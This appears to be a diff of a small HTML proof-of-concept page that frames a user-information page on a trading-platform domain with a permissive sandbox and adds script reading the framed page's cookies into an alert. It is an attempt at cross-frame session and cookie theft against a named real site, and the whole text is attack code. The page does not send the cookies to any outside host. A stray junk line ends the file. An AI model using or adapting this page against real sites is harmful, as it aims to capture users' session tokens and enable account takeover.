@@ -1,8 +1,17 @@
 <html>
-<iframe src="https://my.exnesstrade.markets/v3/user/information"></iframe>
+  <iframe id="frame1" name="frame1" src="https://my.exnesstrade.markets/v3/user/information" onload="readframe1()" 
+sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
+height="600" width="800"></iframe>
+
 <script>
-  
+  var token;
   alert(frames[0].document.cookie);
+  function readframe1(){
+  token = frame1.document.cookie;
+  alert(token);
+  }
+
+
 
 </script>
 sadada
